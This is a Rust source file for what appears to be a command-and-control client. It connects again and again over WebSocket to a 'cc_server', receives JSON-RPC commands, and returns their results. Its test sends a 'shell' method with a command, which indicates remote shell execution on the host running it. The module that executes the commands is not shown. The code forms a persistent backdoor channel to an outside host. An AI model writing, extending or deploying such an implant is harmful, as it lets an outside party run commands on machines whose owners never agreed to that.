use tokio_tungstenite::{connect_async, tungstenite::protocol::Message};
use tokio::time::{sleep, Duration};
use url::Url;
use log::{info, error};
use futures_util::{StreamExt, SinkExt};
use chrono::Utc;
use serde::{Deserialize, Serialize};
use serde_json::{Value};
use serde_json::json;
use crate::jsonrpc_server::handle_method_call;

#[derive(Deserialize)]
struct IncomingMessage {
    id: Option<String>,
    from: Option<String>,
    action: String,
    payload: serde_json::Value,
}

#[derive(Serialize)]
struct JsonRpcResponse {
    jsonrpc: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    err: Option<String>,
    result: Value,
    id: Option<Value>,
}

#[derive(Deserialize)]
struct JsonRpcPayload {
    method: String,
    params: Option<serde_json::Value>,
}

fn make_call_res(id: &Option<String>,from: &Option<String>, result: JsonRpcResponse) -> Option<String> {
    id.as_ref().map(|id_str| {
        let msg = json!({
            "id": id_str,
            "to": from,
            "action": "callback",
            "payload": result
        });
        msg.to_string()
    })
}

pub async fn connect_cc_server_forever(server_url: &str, client_id: &str) {
    loop {
        let url_str = format!(
            "{}?id={}&t={}",
            server_url,
            client_id,
            Utc::now().timestamp_millis()
        );

        let url = match Url::parse(&url_str) {
            Ok(u) => u,
            Err(e) => {
                error!("Invalid URL '{}': {}", url_str, e);
                sleep(Duration::from_secs(5)).await;
                continue;
            }
        };

        info!("[-] Connecting to {}", url);
        let ws_stream = match connect_async(url.clone()).await {
            Ok((stream, _)) => stream,
            Err(e) => {
                error!("[-] Connection error: {}", e);
                sleep(Duration::from_secs(5)).await;
                continue;
            }
        };

        info!("[+] Connected to {}", url);

        let (mut write, mut read) = ws_stream.split();

        loop {
            match read.next().await {
                Some(Ok(msg)) => {
                    match msg {
                        Message::Text(txt) => {
                            info!("Received text: {}", txt);
                            // 这里传写入端 &mut write，并处理错误返回
                            if let Err(e) = handle_msg(&txt, &mut write).await {
                                error!("handle_msg error: {}", e);
                                break; // 出错重连
                            }
                        }
                        Message::Binary(bin) => {
                            info!("Received binary message ({} bytes)", bin.len());
                        }
                        Message::Close(frame) => {
                            if let Some(cf) = frame {
                                info!("Connection closed with code: {}, reason: {}", cf.code, cf.reason);
                            } else {
                                info!("Connection closed without close frame");
                            }
                            break;
                        }
                        Message::Ping(p) => {
                            if let Err(e) = write.send(Message::Pong(p)).await {
                                error!("Failed to send pong: {}", e);
                                break;
                            }
                        }
                        Message::Pong(_) => {}
                        _ => {}
                    }
                }
                Some(Err(e)) => {
                    error!("Error receiving message: {}", e);
                    break;
                }
                None => {
                    info!("Connection stream ended");
                    break;
                }
            }
        }

        info!("[*] Connection closed, retrying in 5 seconds...");
        sleep(Duration::from_secs(5)).await;
    }
}

pub async fn handle_msg<S>(text: &str, ws_sender: &mut S) -> Result<(), Box<dyn std::error::Error>>
where
    S: futures_util::Sink<Message> + Unpin,
    <S as futures_util::Sink<Message>>::Error: std::error::Error + Send + Sync + 'static,
{
    let msg: Result<IncomingMessage, _> = serde_json::from_str(text);
    match msg {
        Ok(incoming) => {
            if incoming.action == "jsonrpc" {
                let rpc: Result<JsonRpcPayload, _> = serde_json::from_value(incoming.payload);
                match rpc {
                    Ok(rpc_payload) => {
                        info!("Received jsonrpc method: {}", rpc_payload.method);
                        let (err, result) = handle_method_call(&rpc_payload.method, &rpc_payload.params);

                        let resp = JsonRpcResponse {
                            jsonrpc: "2.0".to_string(),
                            err,
                            result,
                            id: incoming.id.clone().map(serde_json::Value::String),
                        };

                        if let Some(reply) = make_call_res(&incoming.id,&incoming.from ,resp) {
                            ws_sender.send(Message::Text(reply)).await?;
                        }
                    }
                    Err(e) => {
                        error!("Failed to parse JSON-RPC payload: {}", e);
                    }
                }
            } else {
                info!("Unknown action: {}", incoming.action);
            }
        }
        Err(e) => {
            error!("Failed to parse incoming message JSON: {}", e);
        }
    }
    Ok(())
}


#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_handle_method_call() {
        let text =
            r#"{"id":"1","action":"jsonrpc","payload":{"method":"shell","params":["pwdj"]}}"#;

        let msg: Result<IncomingMessage, _> = serde_json::from_str(text);
        match msg {
            Ok(incoming) => {
                if incoming.action == "jsonrpc" {
                    let rpc: Result<JsonRpcPayload, _> = serde_json::from_value(incoming.payload);
                    match rpc {
                        Ok(rpc_payload) => {
                            println!("Received jsonrpc method: {}", rpc_payload.method);
                            let (err, result) = handle_method_call(&rpc_payload.method, &rpc_payload.params);

                            let resp = JsonRpcResponse {
                                jsonrpc: "2.0".to_string(),
                                err,
                                result,
                                id: incoming.id.clone().map(serde_json::Value::String),
                            };

                            if let Some(reply) = make_call_res(&incoming.id,&incoming.from ,resp) {
                                println!("reply: {}", reply);
                            }
                        }
                        Err(e) => {
                            println!("Failed to parse JSON-RPC payload: {}", e);
                        }
                    }
                } else {
                    println!("Unknown action: {}", incoming.action);
                }
            }
            Err(e) => {
                println!("Failed to parse incoming message JSON: {}", e);
            }
        }
    }

}
